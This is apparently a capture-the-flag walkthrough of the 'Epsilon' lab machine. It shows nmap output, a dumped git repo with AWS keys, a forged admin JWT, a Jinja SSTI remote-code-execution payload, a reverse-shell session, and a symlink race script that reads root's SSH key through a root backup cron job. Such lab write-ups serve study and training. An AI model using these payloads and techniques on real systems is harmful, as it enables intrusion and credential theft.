# Epsilon

---

## Enum

- nmap TCP scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: HEAD POST GET OPTIONS
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- git repo found on port 80 `/.git`
- `cloud` subdomain found on port 80
- dumped git repo `git-dumper`

```
-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
```

- Interesting functions methods:

1. get-account-settings
2. list-functions
3. get-function

- got `lambda_function.py`, -> `http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code`

```py
secret='RrXCv`mrNe!K!4+5`wYq'
``` 

- used this secret for jwt
- `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4`
- created cookie with `auth` name and value of jwt token, now /home and other dirs are accessible
- SSTI on order page
- RCE Payload: `{{''.__class__.__mro__[1].__subclasses__()[389]('id', shell=True, stdout=-1).communicate()[0].strip()}}` on `custume` parameter
- got revshell, as user tom

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.134] 52022
bash: cannot set terminal process group (971): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ whoami
whoami
tom
tom@epsilon:/var/www/app$ which python3
which python3
/usr/bin/python3
tom@epsilon:/var/www/app$ which python
which python
tom@epsilon:/var/www/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
tom@epsilon:/var/www/app$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

tom@epsilon:/var/www/app$ stty rows 39 cols 157
tom@epsilon:/var/www/app$ export TERM=xterm-256color
tom@epsilon:/var/www/app$
```

---

## Privilege Escalation

- linpeas interesting results:

```
Vulnerable to CVE-2021-4034
Vulnerable to CVE-2021-3560

tcp        0      0 127.0.0.1:44117         0.0.0.0:*               LISTEN      -                                                                            
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      993/python3         
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
```

- Found a task that runs periodically as `root`, using `pspy`:

```
2022/12/03 08:46:25 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/12/03 08:47:01 CMD: UID=0    PID=39465  | /usr/sbin/CRON -f 
2022/12/03 08:47:01 CMD: UID=0    PID=39467  | /bin/bash /usr/bin/backup.sh 
2022/12/03 08:47:01 CMD: UID=0    PID=39466  | /bin/sh -c /usr/bin/backup.sh 
2022/12/03 08:47:01 CMD: UID=0    PID=39470  | /usr/bin/tar -cvf /opt/backups/888007109.tar /var/www/app/ 
2022/12/03 08:47:01 CMD: UID=0    PID=39473  | sleep 5
```

- `Backup.sh`:

```bash
#!/bin/bash

file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

1. Clear `/opt/backups` directory.
2. Backup the files from /var/www/app folder and place them in `/opt/backups/<int>` format
3. Generate `sha1` of the tar file and save in `checksum` file and give all permissions to this file
4. sleep for 5 seconds
4. Then tar the previous tar file and `checksum` file and move them to `/var/backups/web_backups/` directory
5. Clears `/opt/backups` again.

```bash
┌──(kali㉿kali)-[~]
└─$ tar --help | grep "\-h" -A1
  -h, --dereference          follow symlinks; archive and dump the files they
                             point to
```

- `-h` in the second `tar` command which fetches the the content of symlinks and does the compression
- To privesc, I'll keep checking for the file `checksum` gets created, then place symlink to `SSH` key of the root user
- The file will be deleted after 5 seconds, so this has to be in a loop
- Wrote the bash script `pwn.sh`:

- To privesc:

1. Keep checking for `checksum` to exist
2. Once found: update the symlink
3. Read root SSH key from `checksum`


```bash
#!/bin/bash
if [ -e /opt/backups/checksum ]; then
	rm -f /opt/backups/checksup
	echo 'CHECKSUM DELETED!'
	ln -sf /root/.ssh/id_rsa /opt/backups/checksum
	echo 'FILE PLANTED.'
fi
```

- Run this in a while loop, when the file gets updated -> check the latest `.tar` file:

```bash
cp /opt/backups/*.tar . && tar -xfv *.tar && cat /opt/backups/checksum 
```